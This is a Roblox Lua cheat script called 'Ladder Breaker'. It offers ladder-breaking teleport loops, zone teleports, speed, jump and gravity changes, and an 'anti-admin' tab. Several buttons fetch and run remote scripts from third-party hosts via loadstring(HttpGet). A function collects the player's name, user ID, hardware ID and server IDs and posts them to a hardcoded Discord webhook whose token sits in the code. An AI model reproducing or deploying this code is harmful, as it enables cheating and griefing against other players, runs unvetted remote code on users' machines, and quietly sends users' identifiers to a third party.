--library библиотека
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Ladder Breaker | DMO", HidePremium = false, IntroEnabled = true, IntroText = "Loading..", SaveConfig = true, ConfigFolder = "OrionTest"})
--locals локальные переменные
local PlayerLog = game.Players.LocalPlayer
--notify уведомление
OrionLib:MakeNotification({
	Name = "LadderBreaker loaded",
	Content = "created by m1kpe0",
	Image = "rbxassetid://4483345998",
	Time = 5
})
--values валуес
_G.breakLadder = true
_G.breakrfullLadder = true
_G.brkspeed = brkspd
_G.clocktm = clktme
_G.tpbug = true
--functions функции
--функции ломания лестницы
function brkLdr()
	while _G.breakLadder == true do
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88, 141, -237)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(90, 140, -234)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(92, 137, -231)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(94, 136, -230)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(95, 135, -228)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(97, 134, -226)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100, 132, -224)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(105, 129, -226)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(109, 127, -228)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111, 125, -227)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 124, -226)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(115, 123, -226)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118, 122, -227)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118, 121, -228)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(120, 120, -229)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 118, -232)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 116, -234)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(126, 114, -237)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 113, -239)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 112, -241)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 112, -244)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(124, 111, -247)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(124, 109, -250)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 107, -253)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 105, -256)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(121, 103, -259)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(120, 101, -261)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(117, 99, -264)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(115, 97, -265)
        wait(_G.brkspeed)
        Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 95, -265)
        wait(_G.brkspeed)
    end
end

function brkldrfull()
	while _G.breakrfullLadder == true do
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(88, 141, -237)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(90, 140, -234)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(92, 137, -231)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(94, 136, -230)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(95, 135, -228)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(97, 134, -226)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(100, 132, -224)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(105, 129, -226)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(109, 127, -228)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111, 125, -227)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 124, -226)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(115, 123, -226)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118, 122, -227)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118, 121, -228)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(120, 120, -229)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 118, -232)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 116, -234)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(126, 114, -237)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 113, -239)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 112, -241)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(125, 112, -244)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(124, 111, -247)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(124, 109, -250)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 107, -253)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(123, 105, -256)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(121, 103, -259)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(120, 101, -261)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(117, 99, -264)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(115, 97, -265)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(113, 95, -265)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(110, 93, -265)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(108, 92, -265)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(105, 90, -264)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(102, 88, -264)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(98, 86, -263)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(95, 84, -262)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(91, 82, -259)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 78, -256)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 76, -253)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 74, -250)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 74, -247)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 73, -244)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 71, -240)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(89, 70, -237)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(90, 68, -234)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(91, 67, -231)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(94, 66, -230)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(96, 64, -228)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99, 62, -226)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(103, 60, -227)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(107, 57, -227)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111, 55, -227)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(114, 53, -228)
		wait(_G.brkspeed)
		Game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118, 50, -228)
		wait(_G.brkspeed)
	end
end
--функция телепортп гличта
function tpglitch()
	while _G.tpbug == true do
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999, 99999999, -9999)
		wait()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(80, 147, -247)
		wait()
	end
end
--функция уведомления когда зашел креатор
function m1kpeehasjoined()
	OrionLib:MakeNotification({
		Name = "m1kpe0 has joined",
		Content = "say hi(привет) to him, f*ckin ladder breaker user",
		Image = "rbxassetid://4483345998",
		Time = 15
	})
end
--вебхук
function webhok()
	local player = game.Players.LocalPlayer
	local plrName = player.Name
	local plrDisplayName = player.DisplayName
	local userid = player.UserId
	local placeid = game.PlaceId
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
	
	local url = "https://webhook.lewisakura.moe/api/webhooks/1279901141580386455/qpnvQjtkpvBAPTceyuN-nI6G0-kTbQ7MIYBUWrRHhToS-4n2iMiW3WHleNX1MUoO9XRG"
	
	local OSTime = os.time();
	local Time = os.date('!*t', OSTime);
	local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
	local Content = '[Ladder Breaker - Full Script]';
	local Embed = {
		title = 'Name: '..plrDisplayName..' ('..plrName..')';
		color = '99999';
		footer = { text = game.JobId };
		author = {
			name = 'Profile';
			url = 'https://www.roblox.com/users/'..userid..'/profile';
		};
		fields = {
			{
				name = 'HWID: '..hwid..'';
				value = 'Place id: '..game.PlaceId..'';
			}
		};
		timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
	};
	(syn and syn.request or http_request) {
		Url = 'https://discord.com/api/webhooks/1279901141580386455/qpnvQjtkpvBAPTceyuN-nI6G0-kTbQ7MIYBUWrRHhToS-4n2iMiW3WHleNX1MUoO9XRG';
		Method = 'POST';
		Headers = {
			['Content-Type'] = 'application/json';
		};
		Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
	};
end
--уведомление когда зашел креатор
game.Players.PlayerAdded:Connect(function(plr)
	if plr.Name == "Yaros1979" then
		print("m1kpe0 has joined")
		m1kpeehasjoined()
	end
end)

--главное
local MainTab = Window:MakeTab({
	Name = "Main",
	Icon = "",
	PremiumOnly = false
})
--тогл 1
MainTab:AddToggle({
	Name = "Break ladder 1",
	Default = false,
	Callback = function(Value)
		_G.breakLadder = Value
        brkLdr()
	end    
})
--тогл 2
MainTab:AddToggle({
	Name = "Break ladder 2 (more)",
	Default = false,
	Callback = function(Value)
		_G.breakrfullLadder = Value
        brkldrfull()
	end    
})
--текстбокс
MainTab:AddTextbox({
	Name = "delay",
	Default = "",
	TextDisappear = true,
	Callback = function(brkspd)
		_G.brkspeed = brkspd
	end	  
})
--текст
MainTab:AddParagraph("anti break ladder","ownertheplace made this")
--телепорт
local TPTab = Window:MakeTab({
	Name = "Teleport",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
--кнопки
TPTab:AddButton({
	Name = "Spawn",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(91, 3, -26)
  	end    
})

TPTab:AddButton({
	Name = "Top of the stairs",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(80, 147, -247)
  	end    
})

TPTab:AddButton({
	Name = "bottom of the stairs",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(93, 3, -232)
  	end    
})

TPTab:AddButton({
	Name = "Green zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(70, 100, -469)
  	end    
})

TPTab:AddButton({
	Name = "Yellow zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(41, 106, -775)
  	end    
})

TPTab:AddButton({
	Name = "Pink zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3, 188, -1188)
  	end    
})

TPTab:AddButton({
	Name = "Purple zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-25, 192, -1534)
  	end    
})

TPTab:AddButton({
	Name = "Orange zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-82, 282, -1824)
  	end    
})

TPTab:AddButton({
	Name = "Dark-yellow zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-122, 264, -2145)
  	end    
})

TPTab:AddButton({
	Name = "Blue zone",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-204, 264, -2620)
  	end    
})

TPTab:AddButton({
	Name = "End",
	Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-238, 265, -2809)
  	end    
})
--анти админ
local AATab = Window:MakeTab({
	Name = "Anti-admin",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
--удаление блюра
AATab:AddButton({
	Name = "Delete blur",
	Callback = function()
        game.Workspace.Camera.Blur:Destroy()
  	end    
})
--игрок
local PlayerTab = Window:MakeTab({
	Name = "Player",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
--слайдеры
PlayerTab:AddTextbox({
	Name = "Speed",
	Default = "",
	TextDisappear = true,
	Callback = function(Speed)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Speed
	end	  
})

PlayerTab:AddTextbox({
	Name = "Jump power",
	Default = "",
	TextDisappear = true,
	Callback = function(Jumpp)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Jumpp
	end	  
})

PlayerTab:AddTextbox({
	Name = "Gravity",
	Default = "",
	TextDisappear = true,
	Callback = function(Grav)
		game.Workspace.Gravity = Grav
	end	  
})

PlayerTab:AddTextbox({
	Name = "Field of view",
	Default = "",
	TextDisappear = true,
	Callback = function(fov)
		game.Workspace.Camera.FieldOfView = fov
	end	  
})
--кнопка р6 аватар
PlayerTab:AddButton({
	Name = "r6 avatar",
	Callback = function()
		loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))("t.me/arceusxscripts")
  	end    
})
--тогл глитч
PlayerTab:AddToggle({
	Name = "glitch",
	Default = false,
	Callback = function(bruh)
		_G.tpbug = bruh
        tpglitch()
	end    
})
--текст
PlayerTab:AddParagraph("Defaults","| Speed - 16 | Jump power - 50 | Gravity - 200 | FOV - 70 |")
--скрипты
local ScriptTab = Window:MakeTab({
	Name = "Scripts",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
--inf yield инфините уиелд
ScriptTab:AddButton({
	Name = "Infinite yield",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
  	end    
})
--systembroken сустемброкен
ScriptTab:AddButton({
	Name = "SystemBroken",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script"))()
  	end    
})
--float флоат
ScriptTab:AddButton({
	Name = "Float",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))("https://t.me/arceusxscripts")
  	end    
})
--shaders шейдеры
ScriptTab:AddButton({
	Name = "Shaders",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))("t.me/arceusxscripts")
  	end    
})
--dex explorer v2 декс в2
ScriptTab:AddButton({
	Name = "Dex Explorer v2",
	Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/dex2.0", true))()
  	end    
})
--clock time время
local ClockTab = Window:MakeTab({
	Name = "Time",
    	Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
--кнопки
ClockTab:AddButton({
	Name = "Night",
	Callback = function()
      		game.Lighting.ClockTime = 0
  	end    
})

ClockTab:AddButton({
	Name = "Day",
	Callback = function()
      		game.Lighting.ClockTime = 10
  	end    
})

ClockTab:AddButton({
	Name = "Morning",
	Callback = function()
      		game.Lighting.ClockTime = 6
  	end    
})

ClockTab:AddButton({
	Name = "Evening",
	Callback = function()
      		game.Lighting.ClockTime = 18
  	end    
})

Timee = 10
--текстбокс
ClockTab:AddTextbox({
	Name = "Time",
	Default = "",
	TextDisappear = true,
	Callback = function(Timee)
		game.Lighting.ClockTime = Timee
	end	  
})

--инфо
local Ctab = Window:MakeTab({
	Name = "Info",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})
Ctab:AddParagraph("v3.4","deleted: ??? (5 seconds); added: webhook(discord), anti-admin tab, tp to bottom of the stairs; renamed: changelog tab, script; cleared: source, changelog tab ")
Ctab:AddParagraph("v3.5, no more updates (maybe)","added working breaking ladder script, glitch. shhhh...")
--скрипты от креатора и его друга
local OStab = Window:MakeTab({
	Name = "Other scripts",
        Image = "rbxassetid://4483345998",
	PremiumOnly = false
})

OStab:AddParagraph("scripts by MahaonMaster_TV and m1kpe0","wait for..")

OrionLib:Init()
